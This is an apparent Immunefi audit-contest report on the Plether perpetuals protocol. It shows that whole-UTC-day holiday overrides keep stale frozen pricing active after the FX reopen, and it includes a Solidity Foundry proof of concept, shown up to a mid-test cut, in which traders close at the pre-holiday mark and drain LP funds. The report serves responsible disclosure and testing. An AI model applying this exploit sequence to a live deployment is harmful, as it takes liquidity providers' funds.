# \#99852 [SC-Medium] Whole-UTC-day holiday overrides keep oracle-frozen pricing active for ~2h after the 22:00 UTC FX reopen, giving traders a free option to close at the stale pre-holiday mark against HousePool LP funds whenever the reopen gap exceeds the frozen-close spread

**Submitted on Nov 15th 2026 at 13:29:58 UTC by @sh15h4nk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99852
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
Holiday overrides can only cover whole UTC days (`CfdEngine.sol:699`). FX holiday closures run from 17:00 New York to 17:00 New York, which is 22:00 UTC to 22:00 UTC in winter. After the Christmas or New Year UTC-day override that SECURITY.md requires (`SECURITY.md:1337-1338`), the market therefore reopens at 22:00 UTC, but Plether keeps oracle-frozen policy until 00:00 UTC. In that window Pyth is publishing live prices. Frozen-mode closes still settle at the Engine's stored pre-holiday mark plus a fixed 0.50% spread, and no one can refresh that mark: frozen policy returns the stored mark before reading any Pyth payload (`PletherOracle.sol:754-756`). Anyone who sees the live reopen price can choose to close an adversely gapped position at the stale mark, and the HousePool (LP capital) pays the difference. In the PoC, under release parameters and a 1% reopen gap, a hedged pair of accounts ends with more USDG than it deposited in both gap directions (+238.17 and +337.70 USDG), while a single 200k holder costs LPs 1,081.09 USDG (54 bps of notional) per exercise. No allowed override setting removes the window without leaving the calendar live while FX is closed, which the PoC also shows blocks every exit and liquidation for the whole holiday. Feasibility is disclosed in full below. A profitable exercise needs a reopen gap above about 0.54% (0.76% for the hedged pair). The two holiday reopens observed in Pyth data moved at most about 6 bps. The first post-launch holiday that falls on a weekday, and so produces the window, is 25 Dec 2028.

## Vulnerability Details

### 1. Overrides are floored to UTC days; the FX holiday boundary is 22:00 UTC
`CfdEngine.applyCalendarConfig` stores each override as a Unix day number (`CfdEngine.sol:698-699`):
```solidity
for (uint256 i; i < config.fadDayTimestamps.length; i++) {
    uint256 day = config.fadDayTimestamps[i] / 86_400;
```
`MarketCalendarLib.marketStatus` then freezes the entire UTC day (`MarketCalendarLib.sol:51-53`):
```solidity
if (todayOverride) {
    return (true, true); // (fadWindow, oracleFrozen)
}
```
The recurring weekend calendar uses the exact 17:00 New York boundary (`MarketCalendarLib.sol:38-49`), so a Sunday reopen is live at 22:00 UTC. A holiday override cannot express that boundary. A Dec 25 override stays frozen until 00:00 UTC Dec 26, two hours after FX reopens. `fadRunwaySeconds` only extends the FAD window into the next day, never `oracleFrozen` (`MarketCalendarLib.sol:54-57`).

The override is not optional. SECURITY.md says "holiday hours still require governance-configured UTC-day overrides" (`SECURITY.md:1337-1338`), and the PoC shows that without one the calendar treats the closed day as live, so every live-priced exit fails (section 4).

### 2. Frozen pricing never reads live data, and nobody can refresh it
When `policy.oracleFrozen` is set, `PletherOracle._resolveCurrentBasket` returns before touching the Pyth payload (`PletherOracle.sol:754-756`):
```solidity
if (policy.oracleFrozen) {
    return _frozenBasket(mode, policy.maxStaleness);
}
```
`_frozenBasket` returns `engine.lastMarkPrice()` and `engine.lastMarkTime()` (`PletherOracle.sol:729-743`). For `CloseExecution` and `MarkRefresh` the age limit is `fadMaxStaleness` (`OracleFreshnessPolicyLib.sol:65-66`), 3 days by default (`CfdEngine.sol:140`), so a ~24h-old eve mark is accepted. Voluntary closes pay the fixed LP-owned `frozenCloseSpreadBps` (50 at release, `DEPLOYMENT.md:132`), which does not scale with staleness (`SECURITY.md:1334`).

During the post-reopen window, a permissionless `OrderRouter.updateMarkPrice` carrying a valid, freshly published Pyth update succeeds without changing the mark. Keepers, LPs and the protocol therefore cannot bring the live price on-chain before 00:00 UTC (`test_PoC_W2_PermissionlessLiveRefreshCannotUnstaleMark`).

### 3. The holiday closure is real and ends at 22:00 UTC (Pyth data)
Pyth Pro history for two of the six release feeds, EUR/USD `0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b` and USD/JPY `0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52` (`script/DeployPerpsArbitrumSepolia.s.sol:147-148`). Method: `fixed_rate@200ms` ranges and `fixed_rate@1000ms` history, counting only `market_session=regular` rows (the API emits synthetic `closed` rows that carry the old price; those are excluded).

| Holiday | Last regular tick | First regular tick | Gap |
| --- | --- | --- | --- |
| Christmas 2025 | 2025-12-24 22:00:00.000Z | 2025-12-25 22:00:00.000Z | 86,400 s, no intervening minute bars |
| New Year 2026 | 2025-12-31 22:00:00.000Z | 2026-01-01 22:00:00.000Z | 86,400 s, no intervening minute bars |

Controls: Thanksgiving 2025 publishes throughout (no override needed). Ordinary Wednesdays (2025-12-17, 2026-01-07) have all hourly bars. Dec 26 00:00Z and Jan 2 00:00Z are live.

Pyth's own published session schedule says the same thing. The Pyth Pro symbol metadata for FX.EUR/USD and FX.USD/JPY (`history.pyth-lazer.dourolabs.app/history/v1/symbols`) gives the schedule `America/New_York;O,O,O,O,0000-1700,C,1700-2400;1224/0000-1700,1231/0000-1700`. The provider defines the holiday closures on the 17:00 New York boundary, the same boundary the recurring weekend calendar implements, and not on UTC midnight.

The oracle requires all six components for a basket (`PletherOracle.sol:613` parses every `pythFeedIds` entry), so two components dark for the whole day mean no valid basket exists on Dec 25 or Jan 1: the override is operationally required. Both components are back at exactly 22:00:00Z, while the override keeps frozen policy until 00:00Z. I could not query the other four feeds (my Pyth key is not entitled to them), so if one of them reopened later the window would start at that tick. The window exists as long as all six reopen before 00:00Z.

### 4. No allowed override setting is safe
With FX closed Dec 24 22:00Z → Dec 25 22:00Z, the PoC evaluates all 8 override subsets of {Dec 24, Dec 25, Dec 26} with the production planner (`test_OverrideSweep_NoAllowedSettingAvoidsBothW1AndW2`):

| Override mask | Result |
| --- | --- |
| none, Dec 26 | calendar live while FX is closed |
| Dec 24 + Dec 25 (+ Dec 26) | frozen while FX is open (this bug; the window grows to the whole Dec 24 session) |
| every other subset | both |

With no override (mask 0), the closed day is treated as live, so for the whole closure a full close cannot fill and expires, liquidation reverts on stale data, and a positioned withdrawal reverts (`test_Control_Mask0_NoOverrideBlocksExitsAndLiquidationsAllClosedDay`). The owner cannot opt out by not configuring the override. Configuring it, as SECURITY.md requires, opens this window. The root cause is the code's day granularity (`CfdEngine.sol:699`), not a parameter value.

## Impact Details
- **Hedged pair (no directional risk).** One actor holds equal 100,000 USDG LONG and SHORT legs in two accounts over the holiday. After the reopen it closes the adversely gapped leg at the stale eve mark inside the window, and the favourable leg at the live mark after 00:00Z. The pair carries no direction risk, but it is net profitable only when |gap| exceeds about 0.76%; below that it loses its fees. Release parameters, 1% reopen gap:

  | Gap | Actor net P&L, control (both legs live) | Actor net P&L, exploit | LP loss vs control |
  | --- | ---: | ---: | ---: |
  | +1.00% | −263.31 USDG | **+238.17 USDG** | 501.08 USDG |
  | −1.00% | −259.71 USDG | **+337.70 USDG** | 558.21 USDG |

  The actor withdraws more USDG than it deposited, and the HousePool funds the difference. This is a net transfer of LP funds to an untrusted address on public information.
- **Single holder.** A 200,000 USDG LONG closed in the window after a +1% gap: holder +1,001.09 USDG versus closing at the live mark; HousePool −1,081.09 USDG (54 bps of notional).
- **Scale and recurrence.** The loss is `size × (|gap| − 0.50% − fees − VPI)`, linear in size up to the open-interest and solvency limits, and open to every holder on both sides. Each LP loss is at least the gap minus the spread, because the trader exercises only when the gap already exceeds the spread.
- **When the window occurs.** It occurs at each Christmas or New Year reopen that falls on Monday–Thursday (22:00–24:00 UTC in winter). A Friday holiday closure runs into the weekend and ends at the exact Sunday boundary. A Saturday holiday needs no override, and Pyth's published schedule has no observed-Monday closure. Assuming Pyth repeats the 2025/26 pattern, the next qualifying dates are therefore 25 Dec 2028 and 1 Jan 2029 (both Monday), then every year in which the holidays fall Monday–Thursday. Christmas 2026 and New Year 2027 (Friday) and 2027/28 (Saturday) do not produce the window.

### Feasibility (disclosed in full; payout-only under the program rules)
The exploit needs a reopen gap above about 0.54% (single holder) or 0.76% (hedged pair). I replayed every regular 200 ms Pyth publication in both real windows (36,001 samples per feed per holiday), measured against the last pre-close tick:

| Window | EUR/USD max \|move\| | Inverse USD/JPY max \|move\| | Two-pair release-weight proxy max \|move\| | Samples ≥ 50 bps |
| --- | ---: | ---: | ---: | ---: |
| Christmas 2025, Dec 25 22:00–24:00Z | 5.69 bps | 13.23 bps | 5.91 bps | 0 |
| New Year 2026, Jan 1 22:00–24:00Z | 4.68 bps | 11.98 bps | 3.52 bps | 0 |

(Proxy = 57.6% EUR/USD and 13.6% inverse USD/JPY release weights, renormalized; the other four feeds were not available to me.) On these two holidays the reopen move did not exceed the spread, so the window would not have been profitable. Pyth history is available only from 2025-09-29, so earlier holidays cannot be measured. The 1% gap in the PoC is illustrative.

For a broader reference, I took the same proxy over all 58 weekend reopens from Oct 2025 to Nov 2026, using 1-minute bars. I measured the largest move within 2h of reopen against the Friday close. Median 11.2 bps, p95 46.7 bps, maximum 69.9 bps. Two of the 58 reached 50 bps and none reached 76 bps. Weekend closures last about 48h against 24h for a holiday, so they are an upper-bound reference. The protocol's own reference-fix sample shows larger tails: 22 of 550 gaps of 3+ days moved more than 1% (`WHITEPAPER.md:1407-1428`). In summary, an exercise needs a news-driven holiday move. It is unlikely on any given holiday, and the hedged pair has not been in the money in the observed data. The program rules state that "Impact is calculated first, separately from feasibility. Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it." The impact here is a demonstrated, direction-free transfer of LP funds whenever the reopen gap exceeds the spread, and the protocol has no mechanism to stop it once the gap is known.

## References
- `packages/perps/src/CfdEngine.sol:689-705` (`applyCalendarConfig`; UTC-day floor at `:699`), `:140` (`fadMaxStaleness`)
- `packages/perps/src/libraries/MarketCalendarLib.sol:30-58` (`marketStatus`; exact weekend boundary `:38-49`; override `:51-53`; runway `:54-57`)
- `packages/perps/src/PletherOracle.sol:729-743` (`_frozenBasket`), `:750-756` (`_resolveCurrentBasket`), `:613` (all six feeds parsed)
- `packages/perps/src/libraries/OracleFreshnessPolicyLib.sol:65-66`
- `packages/perps/src/OrderRouterAdmin.sol:238-242` (`pause()` keeps closes and mark refresh available)
- `packages/perps/SECURITY.md:1382-1383` (stale-window mark vs post-boundary mark)
- Pyth Pro symbol metadata: `history.pyth-lazer.dourolabs.app/history/v1/symbols?query=EUR%2FUSD` (FX session schedule)
- `packages/perps/SECURITY.md:431`, `:824`, `:845`, `:1332-1338`
- `packages/perps/WHITEPAPER.md:1114-1120`, `:1407-1428`
- `packages/perps/DEPLOYMENT.md:132` (`frozenCloseSpreadBps = 50`), `:145` (`fadRunwaySeconds = 1 hours`)
- `script/DeployPerpsArbitrumSepolia.s.sol:147-148` (EUR/USD, USD/JPY feed IDs)



## Proof of Concept

## Proof of Concept


The test extends the repository's `BasePerpTest`, sets the release risk parameters from `DEPLOYMENT.md`, uses an eve basket of 1.25 (not 1.00), and drives the calendar configuration, mark refreshes and every close through production entry points (`CfdEngineAdmin.proposeCalendarConfig`/`finalizeCalendarConfig`, `OrderRouter.commitOrder`/`executeOrder`/`updateMarkPrice`). The eve-day positions are opened with the repository's `BasePerpTest._open` setup helper (an engine call as the Router at the live eve mark). This is ordinary pre-holiday trading and is identical in the exploit and control runs. A Router-committed open would add only the 1 bps open-order bounty (about 20 USDG for the hedged pair), which leaves both exploit results net positive.

1. `test_PoC_W2_HedgedPairProfitsInEitherGapDirection`
   - The owner configures the Dec 25 2025 override through the 72h timelock. On Dec 24 the actor opens equal 100k USDG LONG and SHORT legs in two accounts, and the last eve tick (1.25) is installed at 21:59:30 UTC.
   - Dec 25 22:30 UTC: FX has reopened and Pyth publishes ±1%, but `engine.isOracleFrozen()` is true. The adverse leg closes at the eve mark (asserted). After 00:00 UTC the favourable leg closes at the live mark (asserted).
   - Control: both legs closed live after 00:00 UTC. The actor loses fees in the control and ends in net profit in the exploit, for both gap directions, and the pool is lower by the same amount.
2. `test_PoC_W2_HolidayReopenClosesAtStaleEveMark`: a 200k LONG, +1% gap, full close committed and executed by a keeper inside the window at the eve mark 1.25, against a control close at Dec 26 00:05 UTC at 1.2625.
3. `test_PoC_W2_PermissionlessLiveRefreshCannotUnstaleMark`: inside the window, `OrderRouter.updateMarkPrice` with a fresh post-reopen payload succeeds, but `lastMarkPrice`/`lastMarkTime` stay at the eve values and the next close still settles at the eve mark.
4. `test_Control_Mask0_NoOverrideBlocksExitsAndLiquidationsAllClosedDay`: without the override, the close cannot fill and expires, liquidation reverts, and a positioned withdrawal reverts for the closed day, so the override is required.
5. `test_Control_WeekendReopenIsLiveAtSameOffset`: Sunday 22:30 UTC is live under the recurring calendar, and the holiday is still frozen at the same offset.
6. `test_OverrideSweep_NoAllowedSettingAvoidsBothW1AndW2`: all 8 override subsets of {Dec 24, Dec 25, Dec 26} are wrong at some point.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice L-1 W2: a whole-UTC-day holiday override keeps oracle-frozen policy active after the 22:00 UTC FX reopen.
///         Frozen closes settle at the stored eve mark (PletherOracle `_frozenBasket` = engine.lastMarkPrice()), so a
///         holder who sees the public post-reopen Pyth price closes at the stale eve mark plus the fixed 0.50% spread.
contract L1HolidayW2PoC is BasePerpTest {

    // 2025-12-25 is a Thursday. NY is on standard time, so the FX 17:00 NY boundary is 22:00 UTC.
    uint256 internal constant DEC24 = 1_766_534_400; // 2025-12-24 00:00 UTC
    uint256 internal constant DEC25 = DEC24 + 1 days; // holiday (owner override)
    uint256 internal constant DEC26 = DEC25 + 1 days;
    uint256 internal constant SUN_DEC28 = DEC24 + 4 days; // recurring weekend reopen day

    uint256 internal constant EVE_PRICE = 1.25e8; // last eve mark (basket != 1.00 by design)
    uint256 internal constant REOPEN_PRICE = 1.2625e8; // +1.00% at the 22:00 UTC reopen (basket up = LONG loses)

    address internal constant HOLDER = address(0xA11CE);
    address internal constant KEEPER = address(0xE0EC);
    uint256 internal constant SIZE = 160_000e18; // 1,600 lots -> 200,000 USDG notional at the eve mark
    uint256 internal constant MARGIN = 10_000e6;

    /// Release risk parameters (packages/perps/DEPLOYMENT.md "Initial release parameters").
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // ---------------------------------------------------------------- helpers

    function _ticks(
        uint256 price,
        uint256 publishTime
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, previous));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    /// Keeper refreshes the live mark with a tick published now.
    function _liveMark(
        uint256 price
    ) internal {
        router.updateMarkPrice(_ticks(price, vm.getBlockTimestamp()));
    }

    /// Public Pyth state at a given time (what any observer can read off-chain / from Hermes).
    function _publishPublic(
        uint256 price,
        uint256 publishTime
    ) internal returns (bytes[] memory data) {
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), 0, int32(-8), uint64(publishTime));
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(price)), 0, int32(-8), publishTime, publishTime - 1
        );
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _closeRequest(
        bytes32 clientId,
        CfdTypes.Side side,
        uint256 size
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint64 submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        request.clientOrderId = clientId;
        request.side = side;
        request.sizeDelta = size;
        // Unbounded close: LONG accepts any price <= CAP, SHORT any price >= 1.
        request.targetPrice = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
        request.isClose = true;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: submitBy,
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    struct Outcome {
        uint256 holderBalance;
        uint256 holderClaim;
        uint256 poolAssets;
        uint256 executionPrice;
    }

    /// Owner configures the documented Dec 25 UTC-day holiday override (72h timelock), then the holder opens a LONG
    /// on the eve and the last eve tick is installed at 21:59:30 UTC (FX closes 22:00 UTC).
    function _setUpEve() internal {
        _setUpEveWith(true);
    }

    function _setUpEveWith(
        bool holidayOverride
    ) internal {
        vm.warp(DEC24 - 4 days);
        if (holidayOverride) {
            ICfdEngineAdminHost.EngineCalendarConfig memory config = _engineCalendarConfig();
            config.fadDayTimestamps = new uint256[](1);
            config.fadDayTimestamps[0] = DEC25 + 12 hours; // normalized to UTC day DEC25/86400
            _setCalendarConfig(config);
        }

        _fundTrader(HOLDER, 50_000e6);
        vm.warp(DEC24 + 20 hours);
        vm.roll(vm.getBlockNumber() + 1);
        _liveMark(EVE_PRICE);
        _open(HOLDER, CfdTypes.Side.LONG, SIZE, MARGIN, EVE_PRICE);

        vm.warp(DEC24 + 21 hours + 59 minutes + 30 seconds);
        vm.roll(vm.getBlockNumber() + 1);
        _liveMark(EVE_PRICE); // last eve tick
        assertEq(engine.lastMarkPrice(), EVE_PRICE);
    }

    /// Holder commits a close; a keeper executes it in a later block. Production Router paths only.
    function _closeVia(
        bytes32 clientId,
        uint256 publicPrice
    ) internal returns (Outcome memory out) {
        return _closeAccountVia(HOLDER, CfdTypes.Side.LONG, SIZE, clientId, publicPrice);
    }

    function _closeAccountVia(
        address account,
        CfdTypes.Side side,
        uint256 size,
        bytes32 clientId,
        uint256 publicPrice
    ) internal returns (Outcome memory out) {
        OrderV3Types.OrderRequest memory request = _closeRequest(clientId, side, size);
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        uint256 commitTs = vm.getBlockTimestamp();
        vm.warp(vm.getBlockTimestamp() + 2);
        vm.roll(vm.getBlockNumber() + 1);
        // First qualifying public tick strictly after the commit second (unique-update window semantics).
        bytes[] memory data = _publishPublic(publicPrice, commitTs + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close executed");
        (uint256 remaining,,,,,,) = engine.positions(account);
        assertEq(remaining, 0, "position closed");
        out.holderBalance = clearinghouse.balanceAssets(account);
        out.holderClaim = engine.traderClaimBalanceAssets(account);
        out.poolAssets = pool.totalAssets();
        out.executionPrice = engine.lastMarkPrice();
    }

    // ------------------------------------------------------------------ tests

    /// W2 attack and control from the same eve state.
    function test_PoC_W2_HolidayReopenClosesAtStaleEveMark() public {
        _setUpEve();
        uint256 snap = vm.snapshotState();

        // ATTACK: Dec 25 22:30 UTC. FX reopened at 22:00 UTC and Pyth publishes +1.00%, but the UTC-day override
        // keeps oracle-frozen policy until 00:00 UTC Dec 26.
        vm.warp(DEC25 + 22 hours + 30 minutes);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "W2: calendar frozen after the real 22:00 UTC reopen");
        _publishPublic(REOPEN_PRICE, vm.getBlockTimestamp()); // public live price, visible to the holder
        Outcome memory attack = _closeVia(keccak256("w2-attack"), REOPEN_PRICE);
        assertEq(attack.executionPrice, EVE_PRICE, "frozen close used the stale eve mark, not the live tick");

        vm.revertToState(snap);

        // CONTROL: same close once the override day ends (Dec 26 00:05 UTC). Keepers install the live mark.
        vm.warp(DEC26 + 5 minutes);
        vm.roll(vm.getBlockNumber() + 1);
        assertFalse(engine.isOracleFrozen(), "control: live after 00:00 UTC");
        _liveMark(REOPEN_PRICE);
        Outcome memory control = _closeVia(keccak256("w2-control"), REOPEN_PRICE);
        assertEq(control.executionPrice, REOPEN_PRICE, "control close at the live mark");

        uint256 holderAttack = attack.holderBalance + attack.holderClaim;
        uint256 holderControl = control.holderBalance + control.holderClaim;
        assertGt(holderAttack, holderControl, "holder gains by closing inside W2");
        assertLt(attack.poolAssets, control.poolAssets, "LPs lose by the same order of magnitude");

        uint256 traderGain = holderAttack - holderControl;
        uint256 lpLoss = control.poolAssets - attack.poolAssets;
        uint256 notional = (SIZE / CfdTypes.SIZE_QUANTUM) * EVE_PRICE;
        emit log_named_uint("notional at eve mark (USDG atoms)", notional);
        emit log_named_uint("gross reopen gap value (1.00%)", notional / 100);
        emit log_named_uint("holder gain vs control (atoms)", traderGain);
        emit log_named_uint("LP loss vs control (atoms)", lpLoss);
        emit log_named_uint("LP loss in bps of notional", (lpLoss * 10_000) / notional);
        // Net of the 0.50% frozen spread and fees, LPs still lose ~0.4-0.5% of notional per exercise.
        assertGt(lpLoss, notional / 400, "LP loss > 0.25% of notional");
    }

    /// Nobody can refresh the stale mark during W2: a permissionless router.updateMarkPrice carrying a valid live Pyth
    /// payload (published after the reopen) leaves the Engine mark at the eve value, because frozen policy resolves
    /// `_frozenBasket` (= engine.lastMarkPrice()) before reading the payload. The holder's close therefore still
    /// settles at the eve mark after the refresh attempt.
    function test_PoC_W2_PermissionlessLiveRefreshCannotUnstaleMark() public {
        _setUpEve();
        uint256 eveTime = engine.lastMarkTime();
        vm.warp(DEC25 + 22 hours + 30 minutes);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "W2");

        bytes[] memory live = _ticks(REOPEN_PRICE, vm.getBlockTimestamp()); // fresh, post-reopen, validly signed
        _publishPublic(REOPEN_PRICE, vm.getBlockTimestamp());
        address anyone = address(0xBEEF);
        vm.deal(anyone, 1 ether);
        vm.prank(anyone);
        try router.updateMarkPrice{value: 0.01 ether}(live) {
            emit log_string("router.updateMarkPrice(live payload) succeeded as a no-op refresh");
        } catch (bytes memory err) {
            emit log_named_bytes("router.updateMarkPrice(live payload) reverted", err);
        }
        assertEq(engine.lastMarkPrice(), EVE_PRICE, "mark still the eve price");
        assertEq(engine.lastMarkTime(), eveTime, "mark time still the eve tick");

        Outcome memory out = _closeVia(keccak256("w2-after-refresh"), REOPEN_PRICE);
        assertEq(out.executionPrice, EVE_PRICE, "close still settles at the stale eve mark");
    }

    // ------------------------------------------------------- hedged-pair variant

    address internal constant HEDGE_LONG = address(0xA1);
    address internal constant HEDGE_SHORT = address(0xA2);
    uint256 internal constant HEDGE_SIZE = 80_000e18; // 800 lots per leg -> 100,000 USDG notional per leg
    uint256 internal constant HEDGE_FUNDING = 50_000e6; // per account
    uint256 internal constant GAP_DOWN_PRICE = 1.2375e8; // -1.00% (basket down = SHORT loses)

    /// Same owner override and eve tick; one actor holds equal LONG and SHORT legs in two accounts over the holiday,
    /// so it carries no directional closure risk.
    function _setUpEveHedged() internal {
        vm.warp(DEC24 - 4 days);
        ICfdEngineAdminHost.EngineCalendarConfig memory config = _engineCalendarConfig();
        config.fadDayTimestamps = new uint256[](1);
        config.fadDayTimestamps[0] = DEC25 + 12 hours;
        _setCalendarConfig(config);

        _fundTrader(HEDGE_LONG, HEDGE_FUNDING);
        _fundTrader(HEDGE_SHORT, HEDGE_FUNDING);
        vm.warp(DEC24 + 20 hours);
        vm.roll(vm.getBlockNumber() + 1);
        _liveMark(EVE_PRICE);
        _open(HEDGE_LONG, CfdTypes.Side.LONG, HEDGE_SIZE, MARGIN, EVE_PRICE);
        _open(HEDGE_SHORT, CfdTypes.Side.SHORT, HEDGE_SIZE, MARGIN, EVE_PRICE);

        vm.warp(DEC24 + 21 hours + 59 minutes + 30 seconds);
        vm.roll(vm.getBlockNumber() + 1);
        _liveMark(EVE_PRICE);
    }

    function _actorEquity() internal view returns (uint256) {
        return clearinghouse.balanceAssets(HEDGE_LONG) + engine.traderClaimBalanceAssets(HEDGE_LONG)
            + clearinghouse.balanceAssets(HEDGE_SHORT) + engine.traderClaimBalanceAssets(HEDGE_SHORT);
    }

    /// Exploit: close the adversely gapped leg at the stale eve mark inside W2, close the other leg at the live mark
    /// after 00:00 UTC. Returns the actor's equity and pool assets at the end.
    function _hedgedExploit(
        uint256 reopenPrice
    ) internal returns (uint256 equity, uint256 poolAssets) {
        bool gapUp = reopenPrice > EVE_PRICE;
        (address adverse, CfdTypes.Side adverseSide) =
            gapUp ? (HEDGE_LONG, CfdTypes.Side.LONG) : (HEDGE_SHORT, CfdTypes.Side.SHORT);
        (address favourable, CfdTypes.Side favourableSide) =
            gapUp ? (HEDGE_SHORT, CfdTypes.Side.SHORT) : (HEDGE_LONG, CfdTypes.Side.LONG);

        vm.warp(DEC25 + 22 hours + 30 minutes);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "W2");
        _publishPublic(reopenPrice, vm.getBlockTimestamp());
        Outcome memory stale =
            _closeAccountVia(adverse, adverseSide, HEDGE_SIZE, keccak256("hedge-adverse"), reopenPrice);
        assertEq(stale.executionPrice, EVE_PRICE, "adverse leg closed at the stale eve mark");

        vm.warp(DEC26 + 5 minutes);
        vm.roll(vm.getBlockNumber() + 1);
        _liveMark(reopenPrice);
        Outcome memory live =
            _closeAccountVia(favourable, favourableSide, HEDGE_SIZE, keccak256("hedge-favourable"), reopenPrice);
        assertEq(live.executionPrice, reopenPrice, "favourable leg closed at the live mark");
        return (_actorEquity(), pool.totalAssets());
    }

    /// Control: both legs closed at the live mark after 00:00 UTC (no W2 use).
    function _hedgedControl(
        uint256 reopenPrice
    ) internal returns (uint256 equity, uint256 poolAssets) {
        vm.warp(DEC26 + 5 minutes);
        vm.roll(vm.getBlockNumber() + 1);
        _liveMark(reopenPrice);
        _closeAccountVia(HEDGE_LONG, CfdTypes.Side.LONG, HEDGE_SIZE, keccak256("ctl-long"), reopenPrice);
        _closeAccountVia(HEDGE_SHORT, CfdTypes.Side.SHORT, HEDGE_SIZE, keccak256("ctl-short"), reopenPrice);
        return (_actorEquity(), pool.totalAssets());
    }

    /// A hedged actor profits from W2 in either gap direction, with no closure risk carried over the holiday.
    function test_PoC_W2_HedgedPairProfitsInEitherGapDirection() public {
        _setUpEveHedged();
        uint256 funded = 2 * HEDGE_FUNDING;
        uint256 snap = vm.snapshotState();

        uint256[2] memory reopenPrices = [REOPEN_PRICE, GAP_DOWN_PRICE];
        string[2] memory labels = ["gap +1.00%", "gap -1.00%"];
        for (uint256 i; i < 2; ++i) {
            vm.revertToState(snap);
            (uint256 controlEquity, uint256 controlPool) = _hedgedControl(reopenPrices[i]);
            vm.revertToState(snap);
            (uint256 exploitEquity, uint256 exploitPool) = _hedgedExploit(reopenPrices[i]);

            emit log_string(labels[i]);
            emit log_named_int("  actor net P&L, control (atoms)", int256(controlEquity) - int256(funded));
            emit log_named_int("  actor net P&L, W2 exploit (atoms)", int256(exploitEquity) - int256(funded));
            emit log_named_uint("  LP loss vs control (atoms)", controlPool - exploitPool);
            assertLt(controlEquity, funded, "control: hedged pair loses fees, no free profit");
            assertGt(exploitEquity, funded, "W2 exploit: hedged pair ends in net profit");
            assertLt(exploitPool, controlPool, "LPs fund the profit");
        }
    }

    /// Mask 0 (no holiday override) is not a no-impact setting. The Engine calendar treats the whole FX-closed
    /// Christmas day as live, so with no Pyth FX ticks after the 21:59:30 UTC eve tick every live-priced exit path
    /// fails for the closure: the close cannot fill and then expires, liquidation reverts, and a positioned withdrawal
    /// reverts. This is why SECURITY.md:1337-1338 says holiday hours require UTC-day overrides.
    function test_Control_Mask0_NoOverrideBlocksExitsAndLiquidationsAllClosedDay() public {
        _setUpEveWith(false);
        uint256 eveTick = engine.lastMarkTime();
        uint256[2] memory probes = [DEC25 + 30 minutes, DEC25 + 21 hours + 30 minutes];
        for (uint256 i; i < 2; ++i) {
            vm.warp(probes[i]);
            vm.roll(vm.getBlockNumber() + 1);
            assertFalse(engine.isOracleFrozen(), "no override: calendar live while FX is closed");

            // Close: commit succeeds, but only pre-closure ticks exist, so it cannot fill and then expires.
            OrderV3Types.OrderRequest memory request =
                _closeRequest(keccak256(abi.encode("mask0-close", i)), CfdTypes.Side.LONG, SIZE);
            vm.prank(HOLDER);
            uint64 orderId = router.commitOrder(request);
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(vm.getBlockTimestamp() + 2);
            bytes[] memory lastAvailable = _publishPublic(EVE_PRICE, eveTick); // no newer FX publication exists
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory pending = router.executeOrder(orderId, lastAvailable);
            assertEq(uint8(pending.status), uint8(OrderV3Types.LifecycleStatus.Pending), "close cannot fill");
            emit log_named_uint("  close pending reason", uint8(pending.pendingReason));
